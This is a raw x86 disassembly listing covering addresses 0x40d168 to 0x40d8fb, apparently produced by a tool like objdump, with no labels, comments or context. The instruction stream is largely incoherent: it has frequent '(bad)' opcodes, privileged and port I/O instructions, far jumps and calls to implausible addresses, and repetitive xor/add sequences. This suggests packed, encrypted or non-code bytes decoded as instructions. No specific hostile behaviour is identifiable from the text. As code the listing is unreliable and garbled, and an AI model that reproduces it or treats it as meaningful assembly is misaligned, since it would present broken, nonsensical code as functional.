  40d168:	enter  0x4dc8,0xfa
  40d16c:	add    ecx,edx
  40d16e:	cld    
  40d16f:	scas   eax,DWORD PTR es:[edi]
  40d170:	add    ebx,ebp
  40d172:	dec    ebp
  40d173:	mov    ecx,DWORD PTR [ebx-0x618a1708]
  40d179:	xor    esi,DWORD PTR [edx]
  40d17b:	xor    ebp,DWORD PTR [ebx]
  40d17d:	add    esi,DWORD PTR [ebx]
  40d17f:	add    edi,DWORD PTR [ebx]
  40d181:	test   DWORD PTR [ebp-0x75],esi
  40d184:	mov    edi,eax
  40d186:	adc    BYTE PTR [ebp+0x55],cl
  40d189:	je     0x40d1be
  40d18b:	xor    esi,DWORD PTR [ebx]
  40d18d:	xor    ebp,DWORD PTR [ebx]
  40d18f:	add    ebp,DWORD PTR [ebx]
  40d191:	add    esi,DWORD PTR [ebx]
  40d193:	ror    DWORD PTR [ecx+0x68ec108b],cl
  40d199:	enter  0xcaff,0x8b
  40d19d:	icebp  
  40d19e:	or     al,0xa
  40d1a0:	(bad)  
  40d1a1:	lock retf 
  40d1a3:	enter  0xf2c8,0x4d
  40d1a7:	retf   0xee89
  40d1aa:	or     BYTE PTR [ebp+0x45],dh
  40d1ad:	mov    edi,DWORD PTR [ebx]
  40d1af:	cld    
  40d1b0:	bswap  eax
  40d1b2:	pop    edi
  40d1b3:	mov    esp,0x328b9eff
  40d1b8:	in     al,0x8b
  40d1ba:	(bad)  
  40d1bb:	hlt    
  40d1bc:	pop    ebx
  40d1bd:	jne    0x40d1c7
  40d1bf:	xor    eax,DWORD PTR [ebp+0x33]
  40d1c2:	xor    eax,0x73b082b
  40d1c7:	jbe    0x40d167
  40d1c9:	mov    esi,DWORD PTR [edx]
  40d1cb:	clc    
  40d1cc:	pop    edi
  40d1cd:	mov    edx,eax
  40d1cf:	mov    eax,DWORD PTR [eax]
  40d1d1:	clc    
  40d1d2:	mov    ecx,ecx
  40d1d4:	adc    DWORD PTR [ebp+0x14],0xffffffec
  40d1d8:	inc    ebp
  40d1d9:	in     al,dx
  40d1da:	xor    eax,0xc7009c04
  40d1df:	inc    ebp
  40d1e0:	cld    
  40d1e1:	xor    eax,0xc7f89c85
  40d1e6:	add    esi,esp
  40d1e8:	inc    ebp
  40d1e9:	test   edi,eax
  40d1eb:	clc    
  40d1ec:	hlt    
  40d1ed:	inc    ebp
  40d1ee:	test   DWORD PTR ds:0x53579cf8,esi
  40d1f4:	inc    ebp
  40d1f5:	inc    ebp
  40d1f6:	aad    0x36
  40d1f8:	xlat   BYTE PTR ds:[ebx]
  40d1f9:	pushf  
  40d1fa:	mov    ecx,DWORD PTR [ebx-0x41b21304]
  40d200:	mov    eax,0x7070808
  40d205:	xor    edi,eax
  40d207:	mov    edi,0x32729e
  40d20c:	xor    eax,edi
  40d20e:	add    eax,DWORD PTR [ebp+0x3]
  40d211:	(bad)  
  40d212:	pavgb  mm7,mm1
  40d215:	test   DWORD PTR [esi-0x8],eax
  40d218:	dec    ebp
  40d219:	inc    ebp
  40d21a:	mov    edx,ebp
  40d21c:	cld    
  40d21d:	xlat   BYTE PTR ds:[ebx]
  40d21e:	enter  0xf0c7,0xf0
  40d222:	retf   0xf200
  40d225:	add    dh,cl
  40d227:	leave  
  40d228:	jne    0x40d26f
  40d22a:	mov    ecx,DWORD PTR [ebx-0x39ea1304]
  40d230:	enter  0xf0ce,0xc7
  40d234:	retf   0xf2cf
  40d237:	scas   eax,DWORD PTR es:[edi]
  40d238:	out    dx,al
  40d239:	jmp    0x40d288
  40d23b:	mov    esi,DWORD PTR [ebx]
  40d23d:	cld    
  40d23e:	add    eax,edi
  40d240:	xor    eax,esi
  40d242:	jmp    0x40d289
  40d244:	xor    ecx,DWORD PTR [ebp-0x1ffc07cd]
  40d24a:	add    edi,edi
  40d24c:	ror    DWORD PTR [ecx+0x45f8f889],cl
  40d252:	dec    ebp
  40d253:	mov    esi,DWORD PTR [ebx]
  40d255:	cld    
  40d256:	lea    eax,[edi+ecx*1+0xff72e0]
  40d25d:	mov    ecx,DWORD PTR [ebp-0xc]
  40d260:	mov    ecx,DWORD PTR [ebp-0x4]
  40d263:	xor    esi,eax
  40d265:	(bad)  
  40d266:	enter  0xce08,0x72
  40d26a:	stc    
  40d26b:	add    BYTE PTR [edx+0x5f8b4545],ch
  40d271:	call   0x33861f79
  40d276:	pop    esi
  40d277:	xor    eax,ebx
  40d279:	sub    ecx,DWORD PTR [ebx+0x20fc818b]
  40d27f:	enter  0xb900,0xc7
  40d283:	inc    ebp
  40d284:	in     al,dx
  40d285:	xor    eax,DWORD PTR [ebp+0x4589f803]
  40d28b:	clc    
  40d28c:	xor    al,0x45
  40d28e:	pushf  
  40d28f:	ss (bad) 
  40d291:	pushf  
  40d292:	call   0xf92c5922
  40d297:	mov    eax,edi
  40d299:	loopne 0x40d27f
  40d29b:	inc    ebp
  40d29c:	test   DWORD PTR [ebx],esi
  40d29e:	clc    
  40d29f:	add    eax,DWORD PTR [ebp-0x2d]
  40d2a2:	push   esi
  40d2a3:	mov    DWORD PTR [edi-0x4],edx
  40d2a6:	push   ecx
  40d2a7:	inc    ebp
  40d2a8:	push   edi
  40d2a9:	mov    al,dh
  40d2ab:	mov    BYTE PTR [esi+0x34d320b],bl
  40d2b1:	mov    ecx,DWORD PTR [ecx+0x45b6f8f8]
  40d2b7:	xor    edi,DWORD PTR ds:0xc7089c89
  40d2bd:	dec    ebp
  40d2be:	cld    
  40d2bf:	mov    ebx,DWORD PTR [eax]
  40d2c1:	or     dl,ch
  40d2c3:	into   
  40d2c4:	inc    ebp
  40d2c5:	iret   
  40d2c6:	or     dl,cl
  40d2c8:	add    BYTE PTR [ebx+ecx*4-0xb007420],cl
  40d2cf:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2d2:	xor    ecx,edx
  40d2d4:	xor    ecx,DWORD PTR [ebp+0x3]
  40d2d7:	mov    eax,DWORD PTR [ebx]
  40d2d9:	hlt    
  40d2da:	bswap  esi
  40d2dc:	rol    DWORD PTR [ecx+esi*1+0x2b32459e],0x89
  40d2e4:	xor    ecx,DWORD PTR [eax]
  40d2e6:	mov    DWORD PTR [ebp-0x8],eax
  40d2e9:	xor    ebx,DWORD PTR [ebp-0x47]
  40d2ec:	call   0x40d17e
  40d2f1:	enter  0x4d45,0x8b
  40d2f5:	mov    eax,edi
  40d2f7:	lock dec ebp
  40d2f9:	inc    ebp
  40d2fa:	mov    DWORD PTR [ebx-0x39040f73],ecx
  40d300:	inc    edi
  40d302:	inc    ebp
  40d303:	enter  0x918b,0xfc
  40d307:	inc    ebp
  40d308:	(bad)  
  40d309:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3962]
  40d310:	mov    DWORD PTR [esi-0x4],ebx
  40d313:	rol    DWORD PTR [ebp-0x37],0x8b
  40d317:	add    al,0xf4
  40d319:	push   ebp
  40d31a:	into   
  40d31b:	in     al,dx
  40d31c:	mov    BYTE PTR [ebp-0x3f],0x8b
  40d320:	dec    ebp
  40d321:	or     BYTE PTR [ebx],bh
  40d323:	xor    BYTE PTR [esi+0x1],0x8b
  40d327:	add    ah,ah
  40d329:	add    dh,al
  40d32b:	in     al,dx
  40d32c:	(bad)  
  40d32d:	push   ebx
  40d32e:	inc    ebp
  40d32f:	mov    eax,edi
  40d331:	adc    al,ch
  40d333:	push   ss
  40d334:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40d33a:	popa   
  40d33b:	iret   
  40d33c:	dec    ebp
  40d33d:	sahf   
  40d33e:	mov    esi,DWORD PTR [edx]
  40d340:	clc    
  40d341:	add    ecx,esi
  40d343:	cmp    ecx,edi
  40d345:	jne    0x40d32f
  40d347:	add    DWORD PTR [ebp-0x62],0x4208648b
  40d34e:	or     BYTE PTR [ebx+0x48ae94d],bl
  40d354:	or     eax,DWORD PTR [eax]
  40d356:	push   ebp
  40d357:	dec    ebp
  40d358:	jnp    0xd00ae027
  40d35e:	dec    ebp
  40d35f:	xlat   BYTE PTR ds:[ebx]
  40d360:	mov    ecx,ebx
  40d362:	call   0x340b293a
  40d367:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  40d36e:	(bad)  
  40d36f:	cld    
  40d370:	sti    
  40d371:	lahf   
  40d372:	(bad)  
  40d373:	mov    ebp,0x8b330055
  40d378:	mov    DWORD PTR [eax],ecx
  40d37a:	clc    
  40d37b:	iret   
  40d37c:	dec    ebp
  40d37d:	retf   
  40d37e:	xor    eax,ecx
  40d380:	lea    eax,[eax+ecx*1+0x7204]
  40d387:	dec    ebp
  40d388:	inc    ebp
  40d389:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  40d38f:	mov    esp,DWORD PTR [edx+0x14]
  40d392:	int    0x6
  40d394:	sub    eax,DWORD PTR [ebp+0x3]
  40d397:	(bad)  
  40d398:	lock or BYTE PTR [ebp-0x7b],cl
  40d39c:	mov    edi,eax
  40d39e:	in     al,dx
  40d39f:	xor    al,0x4d
  40d3a1:	pushf  
  40d3a2:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40d3a8:	jne    0x40d333
  40d3aa:	mov    ebx,DWORD PTR [eax]
  40d3ac:	in     al,0x45
  40d3ae:	dec    ebp
  40d3af:	mov    esi,DWORD PTR [ebx]
  40d3b1:	nop
  40d3b2:	add    eax,DWORD PTR [eax]
  40d3b4:	pop    edi
  40d3b5:	mov    esi,DWORD PTR [ebx]
  40d3b7:	mov    DWORD PTR [ebx-0x2c],ebx
  40d3ba:	ret    0x4d
  40d3bd:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  40d3c3:	mov    ecx,DWORD PTR [ebp+0x3]
  40d3c6:	mov    edi,DWORD PTR [eax+edx*4]
  40d3c9:	dec    ebp
  40d3ca:	add    BYTE PTR [ebx-0x387cf775],cl
  40d3d0:	jo     0x40d395
  40d3d2:	push   esi
  40d3d3:	inc    ebp
  40d3d4:	jne    0x40d361
  40d3d6:	mov    ecx,DWORD PTR [eax]
  40d3d8:	push   edi
  40d3d9:	(bad)  
  40d3da:	push   edi
  40d3db:	ret    
  40d3dc:	push   ecx
  40d3dd:	inc    ebp
  40d3de:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  40d3e4:	add    BYTE PTR [ebx+0x45d10ccb],al
  40d3ea:	jnp    0x406de01d
  40d3f0:	jg     0x40d37d
  40d3f2:	jmp    0x54:0xde85700c
  40d3f9:	inc    ebp
  40d3fa:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  40d3fe:	push   ebp
  40d3ff:	cmp    BYTE PTR [ebx],dh
  40d401:	dec    ebp
  40d402:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  40d408:	cmp    esp,DWORD PTR [ebx]
  40d40a:	jne    0x40d397
  40d40c:	or     DWORD PTR [esi+ebx*4],0xef036440
  40d413:	jmp    0x40d42a
  40d415:	mov    ebp,ecx
  40d417:	push   esp
  40d418:	add    al,0x45
  40d41a:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  40d420:	add    eax,ebx
  40d422:	cmp    eax,DWORD PTR [ebp+0xf]
  40d425:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  40d42c:	sbb    BYTE PTR [ebp+0x45],al
  40d42f:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40d435:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  40d43b:	mov    DWORD PTR [ebp+0x14],eax
  40d43e:	xor    eax,0xba339c45
  40d443:	pushf  
  40d444:	test   edi,eax
  40d446:	clc    
  40d447:	adc    al,0x55
  40d449:	test   DWORD PTR [ebx+0x454518f8],ecx
  40d44f:	xor    DWORD PTR [ebx-0x7f74e764],ecx
  40d455:	lock add DWORD PTR [ebp+0x0],ecx
  40d459:	xor    eax,DWORD PTR [eax]
  40d45b:	add    ecx,DWORD PTR [ebp+0xf]
  40d45e:	mov    eax,ecx
  40d460:	sbb    BYTE PTR [ebp-0x77],cl
  40d463:	mov    eax,DWORD PTR [ecx]
  40d465:	rol    BYTE PTR [eax],1
  40d467:	iret   
  40d468:	or     DWORD PTR [eax+ecx*2+0xc32899e],ecx
  40d46f:	cmp    eax,DWORD PTR [ebp+0xf]
  40d472:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40d479:	or     BYTE PTR [ebp-0x39],al
  40d47c:	xor    eax,ebx
  40d47e:	add    eax,DWORD PTR [ebp-0x77]
  40d481:	mov    edx,DWORD PTR [eax+ebx*1]
  40d484:	inc    ebp
  40d485:	inc    ebp
  40d486:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  40d48c:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  40d492:	mov    ebp,eax
  40d494:	cmp    cl,dh
  40d496:	dec    ebp
  40d497:	dec    DWORD PTR [eax+0x45]
  40d49a:	inc    ecx
  40d49b:	(bad)  
  40d49c:	mov    esp,eax
  40d49e:	or     al,0x85
  40d4a0:	sbb    al,bh
  40d4a2:	inc    eax
  40d4a3:	inc    ebp
  40d4a4:	mov    esi,DWORD PTR [ebx]
  40d4a6:	or     al,0x3
  40d4a8:	dec    ecx
  40d4a9:	push   eax
  40d4aa:	dec    eax
  40d4ab:	inc    ebp
  40d4ac:	rcl    BYTE PTR [eax-0x38],1
  40d4af:	push   eax
  40d4b0:	inc    ebp
  40d4b1:	dec    DWORD PTR [ebx-0x3e07c775]
  40d4b7:	rol    BYTE PTR [ebx],0x4e
  40d4ba:	inc    eax
  40d4bb:	inc    ebp
  40d4bc:	mov    DWORD PTR [ebx],esi
  40d4be:	sbb    BYTE PTR [ebx],al
  40d4c0:	inc    ebp
  40d4c1:	push   eax
  40d4c2:	xor    esi,DWORD PTR [ebp+0x3]
  40d4c5:	lea    ecx,[ecx+0x45e814b8]
  40d4cb:	cmc    
  40d4cc:	xor    edi,edi
  40d4ce:	add    eax,DWORD PTR [ebp-0x77]
  40d4d1:	mov    DWORD PTR [eax+eiz*8],edx
  40d4d4:	inc    ebp
  40d4d5:	inc    ebp
  40d4d6:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  40d4dc:	ret    
  40d4dd:	inc    ebp
  40d4de:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  40d4e4:	adc    al,0x8b
  40d4e6:	test   DWORD PTR [eax],edx
  40d4e8:	clc    
  40d4e9:	inc    ecx
  40d4ea:	inc    ebp
  40d4eb:	mov    esi,DWORD PTR [edx]
  40d4ed:	loopne 0x40d48b
  40d4ef:	enter  0x16c7,0x14
  40d4f3:	inc    ebp
  40d4f4:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  40d4fa:	mov    eax,DWORD PTR [ebx]
  40d4fc:	sbb    BYTE PTR [eax],cl
  40d4fe:	(bad)  
  40d4ff:	dec    ebp
  40d500:	ret    
  40d501:	sub    ebp,DWORD PTR [edi+0x8028be9]
  40d507:	add    BYTE PTR [ebp+0xc],dl
  40d50a:	xor    esi,DWORD PTR [ebp-0x73]
  40d50d:	lea    edx,[ecx]
  40d50f:	lods   al,BYTE PTR ds:[esi]
  40d510:	jb     0x40d4fa
  40d512:	add    ch,dh
  40d514:	sar    edi,0x83
  40d517:	xor    eax,0x89009c03
  40d51c:	inc    ebp
  40d51d:	int3   
  40d51e:	xor    eax,DWORD PTR [ebp+0x3]
  40d521:	xor    al,0x89
  40d523:	pushf  
  40d524:	adc    al,0xc7
  40d526:	inc    ebp
  40d527:	les    eax,FWORD PTR [ebx]
  40d529:	test   esp,ebx
  40d52b:	clc    
  40d52c:	inc    ebp
  40d52d:	inc    ebp
  40d52e:	push   DWORD PTR [edx]
  40d530:	hlt    
  40d531:	pushf  
  40d532:	jne    0x40d4c1
  40d534:	mov    ecx,esp
  40d536:	or     al,0x4d
  40d538:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  40d53e:	clc    
  40d53f:	lea    eax,[ebp-0x3c]
  40d542:	cmp    eax,0x8b8d9c4d
  40d547:	shl    al,0x4d
  40d54a:	(bad)  
  40d54b:	mov    eax,ebx
  40d54d:	or     BYTE PTR [ebp-0x17344731],cl
  40d553:	dec    ebp
  40d554:	imul   ecx
  40d556:	inc    DWORD PTR [ecx]
  40d558:	inc    ebp
  40d559:	add    BYTE PTR [ebp-0x74638bcd],al
  40d55f:	pavgb  mm7,mm6
  40d562:	mov    DWORD PTR [eax],0xf0ff8bc3
  40d568:	clc    
  40d569:	iret   
  40d56a:	inc    ebp
  40d56b:	lock push eax
  40d56d:	retf   
  40d56e:	fmul   QWORD PTR [ebp-0x1]
  40d571:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40d577:	test   BYTE PTR [ebx+0x4d32e09e],cl
  40d57d:	mov    DWORD PTR [ebx],ebp
  40d57f:	loopne 0x40d50a
  40d581:	inc    ebp
  40d582:	loopne 0x40d50f
  40d584:	inc    ebp
  40d585:	loopne 0x40d512
  40d587:	xbegin 0x4091650
  40d58d:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  40d594:	jb     0x40d5e6
  40d596:	mov    ecx,DWORD PTR [eax+edi*8]
  40d599:	inc    ebp
  40d59a:	inc    eax
  40d59b:	push   eax
  40d59c:	mov    ebx,DWORD PTR [edi-0x8]
  40d59f:	inc    DWORD PTR [ecx-0x75]
  40d5a2:	mov    ebp,esp
  40d5a4:	loopne 0x40d5a6
  40d5a6:	rol    edi,0xee
  40d5a9:	test   BYTE PTR [eax],al
  40d5ab:	dec    edx
  40d5ac:	push   0x32
  40d5ae:	dec    DWORD PTR [ebx-0x30baf70c]
  40d5b4:	push   eax
  40d5b5:	mov    dh,0x94
  40d5b7:	add    edi,edi
  40d5b9:	cmp    edi,DWORD PTR [eax-0x7877af1]
  40d5bf:	add    BYTE PTR [ebp-0x75],al
  40d5c2:	(bad)  
  40d5c3:	call   0xc7c5d690
  40d5c8:	clc    
  40d5c9:	test   BYTE PTR [ebp+0x4a],al
  40d5cc:	xor    esi,DWORD PTR [edx]
  40d5ce:	pushf  
  40d5cf:	mov    eax,edi
  40d5d1:	or     al,al
  40d5d3:	iret   
  40d5d4:	test   DWORD PTR [esi+0x3b4d03f8],esi
  40d5da:	mov    DWORD PTR [edi],ecx
  40d5dc:	in     al,dx
  40d5dd:	pop    eax
  40d5de:	dec    ebp
  40d5df:	add    BYTE PTR [ecx+0x4df8e88b],cl
  40d5e5:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  40d5eb:	dec    edx
  40d5ec:	mov    DWORD PTR [edx],esi
  40d5ee:	in     al,0x8b
  40d5f0:	dec    ebp
  40d5f1:	or     BYTE PTR [ebx],dh
  40d5f3:	iret   
  40d5f4:	add    esi,DWORD PTR [esi+0x3be00389]
  40d5fa:	test   DWORD PTR [edi],0x3d3800
  40d600:	test   DWORD PTR [ebx+0x84e4f8],ecx
  40d606:	add    edi,eax
  40d608:	add    BYTE PTR [ebp+ecx*2-0x74cdccb6],al
  40d60f:	mov    eax,DWORD PTR [ebx]
  40d611:	or     BYTE PTR [ecx+0x45b614cf],cl
  40d617:	add    esi,DWORD PTR [ebx]
  40d619:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  40d61f:	add    BYTE PTR [eax],al
  40d621:	mov    eax,DWORD PTR [ebp-0x18]
  40d624:	mov    eax,DWORD PTR [eax]
  40d626:	lock (bad) 
  40d628:	dec    ebp
  40d629:	test   BYTE PTR [ebx],dh
  40d62b:	dec    edx
  40d62c:	add    esi,DWORD PTR [edx]
  40d62e:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  40d634:	or     bh,cl
  40d636:	(bad)  
  40d637:	mov    ebx,es
  40d639:	dec    edx
  40d63a:	push   0x32
  40d63c:	lea    esi,[edx]
  40d63e:	lods   al,BYTE PTR ds:[esi]
  40d63f:	mov    ebp,eax
  40d641:	clc    
  40d642:	cli    
  40d643:	or     edi,edi
  40d645:	iret   
  40d646:	inc    ebp
  40d647:	mov    WORD PTR [ebx-0x75cdccb6],cs
  40d64d:	or     al,BYTE PTR ds:0xec728b
  40d653:	or     DWORD PTR [ebp-0x31],ecx
  40d656:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb2]
  40d65d:	cmp    al,cl
  40d65f:	je     0x40d839
  40d665:	mov    eax,DWORD PTR [ebp-0x8]
  40d668:	mov    eax,DWORD PTR [eax]
  40d66a:	xor    eax,edi
  40d66c:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  40d673:	mov    ecx,DWORD PTR [ebp-0x18]
  40d676:	xor    ecx,DWORD PTR [ecx]
  40d678:	bswap  edi
  40d67a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb6],0x32
  40d682:	add    DWORD PTR [ebx+0x945e400],ecx
  40d688:	mov    ecx,edi
  40d68a:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d691:	or     al,BYTE PTR [eax]
  40d693:	mov    ecx,DWORD PTR [ebp-0x18]
  40d696:	xor    ecx,DWORD PTR [ecx]
  40d698:	bswap  edi
  40d69a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb2],0x3a
  40d6a2:	add    DWORD PTR [edi],ecx
  40d6a4:	add    BYTE PTR [eax-0x7474ffbb],dl
  40d6aa:	xor    esp,esp
  40d6ac:	mov    al,BYTE PTR [eax]
  40d6ae:	add    eax,0x8472c7
  40d6b3:	dec    edx
  40d6b4:	dec    ebp
  40d6b5:	xor    dh,BYTE PTR [ebx]
  40d6b7:	mov    ecx,DWORD PTR [edi]
  40d6b9:	clc    
  40d6ba:	ror    BYTE PTR [ecx],0xcb
  40d6bd:	iret   
  40d6be:	ror    DWORD PTR [esp+eax*4+0x32014a],0x32
  40d6c6:	inc    ebp
  40d6c7:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  40d6cd:	iret   
  40d6ce:	add    eax,0x4a728c
  40d6d3:	xor    cl,BYTE PTR [ebp+0xa]
  40d6d6:	mov    ecx,DWORD PTR [ebx+0x98af833]
  40d6dc:	or     eax,0x8c72cf
  40d6e1:	dec    esi
  40d6e2:	shl    DWORD PTR [edx],0x4d
  40d6e5:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  40d6eb:	in     al,0xd
  40d6ed:	add    BYTE PTR [edx-0x39],dh
  40d6f0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  40d6f7:	mov    esi,DWORD PTR [ebx]
  40d6f9:	in     al,dx
  40d6fa:	mov    cl,BYTE PTR [ecx]
  40d6fc:	or     eax,0x8c72cf
  40d701:	dec    edx
  40d702:	enter  0x8532,0x32
  40d706:	add    BYTE PTR [ebx+0x945e800],cl
  40d70c:	mov    ecx,edi
  40d70e:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d715:	or     al,BYTE PTR [eax]
  40d717:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d71a:	mov    ecx,DWORD PTR [ecx]
  40d71c:	xor    ecx,edi
  40d71e:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724e]
  40d725:	cmp    al,cl
  40d727:	jne    0x40d776
  40d729:	lea    ecx,[ebx-0x7517cc54]
  40d72f:	cli    
  40d730:	or     eax,0x4d72ff
  40d735:	cmp    eax,ecx
  40d737:	je     0x40d786
  40d739:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  40d73f:	ret    
  40d740:	or     eax,0x8b7245
  40d745:	lock enter 0x85c7,0x84
  40d74a:	add    BYTE PTR [esi+0x33453200],bl
  40d750:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40d756:	add    eax,0x37233
  40d75b:	cmp    ecx,DWORD PTR [ebp+0xf]
  40d75e:	mov    esi,edi
  40d760:	xor    edi,edi
  40d762:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40d768:	add    BYTE PTR [ebx],dh
  40d76a:	rol    DWORD PTR [ebx],0x4d
  40d76d:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  40d773:	lock or eax,0x33724d
  40d779:	(bad)  
  40d77a:	ror    DWORD PTR [eax],0x4d
  40d77d:	jb     0x40d70a
  40d77f:	add    BYTE PTR [ebx],dh
  40d781:	ja     0x40d70d
  40d783:	sbb    BYTE PTR ds:0x8d7275,cl
  40d789:	xchg   esp,eax
  40d78a:	enter  0x50e8,0xf3
  40d78e:	inc    ebp
  40d78f:	dec    DWORD PTR [ebx-0x7574ccbb]
  40d795:	loopne 0x40d79c
  40d797:	(bad)  
  40d798:	jb     0x40d75d
  40d79a:	add    cl,al
  40d79c:	dec    ebp
  40d79d:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  40d7a3:	add    ecx,DWORD PTR ds:0x187250
  40d7a9:	inc    ebp
  40d7aa:	rcl    DWORD PTR [eax+0x4d],0x4f
  40d7ae:	mov    edi,edi
  40d7b0:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40d7b6:	jb     0x40d741
  40d7b8:	add    BYTE PTR [ecx+eax*8],dl
  40d7bb:	jne    0x40d80a
  40d7bd:	dec    DWORD PTR [ebx-0x75baccec]
  40d7c3:	add    ecx,DWORD PTR ds:0xe872d8
  40d7c9:	repnz enter 0x10ff,0x45
  40d7ce:	inc    ebp
  40d7cf:	mov    edx,DWORD PTR [eax-0x20]
  40d7d2:	mov    ds:0x8bc3ffc7,eax
  40d7d7:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  40d7df:	mov    esi,DWORD PTR [ebx]
  40d7e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e2:	add    eax,DWORD PTR [ebp-0x77]
  40d7e5:	push   eax
  40d7e6:	adc    al,0x15
  40d7e8:	inc    ebp
  40d7e9:	push   DWORD PTR [ebx]
  40d7eb:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  40d7f1:	add    DWORD PTR [eax],eax
  40d7f3:	mov    eax,edi
  40d7f5:	test   al,0x4d
  40d7f7:	inc    ebp
  40d7f8:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  40d7fe:	retf   
  40d7ff:	mov    edx,ecx
  40d801:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  40d808:	inc    ebp
  40d809:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  40d80f:	xor    eax,ebx
  40d811:	(bad)  
  40d812:	enter  0x1111,0x72
  40d816:	inc    ebp
  40d817:	add    BYTE PTR [ebx-0x387de73f],cl
  40d81d:	cld    
  40d81e:	test   bh,bh
  40d820:	sahf   
  40d821:	jne    0x40d855
  40d823:	mov    ebp,ebx
  40d825:	fsubr  DWORD PTR [edx+0x6]
  40d828:	dec    DWORD PTR [edx]
  40d82a:	hlt    
  40d82b:	xor    eax,0x7f502d45
  40d830:	sbb    ch,ah
  40d832:	call   DWORD PTR [edx-0x75]
  40d835:	pop    esi
  40d836:	or     cl,cl
  40d838:	dec    ebp
  40d839:	adc    al,0x33
  40d83b:	push   ebp
  40d83c:	add    ebp,esp
  40d83e:	cmp    esp,esp
  40d840:	je     0x40d7c5
  40d842:	mov    esp,DWORD PTR [eax]
  40d844:	or     BYTE PTR ds:0x89c39cc7,dh
  40d84a:	push   0x24
  40d84c:	lea    ecx,[ebp+0x44e8ff94]
  40d852:	clc    
  40d853:	or     al,0xff
  40d855:	push   esp
  40d856:	inc    ebp
  40d857:	or     BYTE PTR [ebx+0x450818be],al
  40d85d:	pop    es
  40d85e:	call   esi
  40d860:	test   al,0xbf
  40d862:	jne    0x40d8d6
  40d864:	mov    eax,DWORD PTR [eax]
  40d866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d867:	xlat   BYTE PTR ds:[ebx]
  40d868:	inc    ebp
  40d869:	push   esp
  40d86a:	push   eax
  40d86b:	or     al,0xde
  40d86d:	push   ebp
  40d86e:	dec    DWORD PTR [ecx-0x74f7db75]
  40d874:	dec    ebp
  40d875:	adc    BYTE PTR [ebx],dh
  40d877:	rol    DWORD PTR [ebx],1
  40d879:	sbb    BYTE PTR [ebx],bh
  40d87b:	dec    esp
  40d87c:	je     0x40d892
  40d87e:	push   0x54
  40d880:	call   DWORD PTR [eax]
  40d882:	test   al,0xce
  40d884:	inc    ebp
  40d885:	iret   
  40d886:	add    ebp,DWORD PTR [edi+0x24e889d8]
  40d88c:	clc    
  40d88d:	jmp    0x85da91
  40d892:	mov    edx,eax
  40d894:	test   al,0x1f
  40d896:	or     BYTE PTR [ebp+eax*2+0x10],al
  40d89a:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  40d89e:	inc    ebp
  40d89f:	(bad)  
  40d8a0:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9e]
  40d8a7:	mov    DWORD PTR [ebx],eax
  40d8a9:	and    al,0xf
  40d8ab:	push   0xf84d85c1
  40d8b0:	mov    edi,ebp
  40d8b2:	rol    BYTE PTR [eax],1
  40d8b4:	iret   
  40d8b5:	or     DWORD PTR [ebx+esi*1+0x75329c9e],0x850f683b
  40d8c0:	push   edi
  40d8c1:	clc    
  40d8c2:	(bad)  
  40d8c3:	jmp    0x40d850
  40d8c5:	add    BYTE PTR [eax],dl
  40d8c7:	mov    eax,0xf8898545
  40d8cc:	jmp    0x40d89e
  40d8ce:	add    DWORD PTR [ebp+0x64009e],0x206544bf
  40d8d8:	pop    edi
  40d8d9:	inc    esp
  40d8da:	pop    ebx
  40d8db:	sbb    dl,al
  40d8dd:	inc    ebp
  40d8de:	add    BYTE PTR [ecx-0x747cdb75],cl
  40d8e4:	clc    
  40d8e5:	and    al,0xec
  40d8e7:	mov    DWORD PTR [ecx-0x7747adc],edi
  40d8ed:	and    al,0x4c
  40d8ef:	mov    DWORD PTR [eax],ecx
  40d8f1:	and    al,0x41
  40d8f3:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  40d8f9:	and    al,0x24
  40d8fb:	xor    edx,DWORD PTR [esi+0x3]
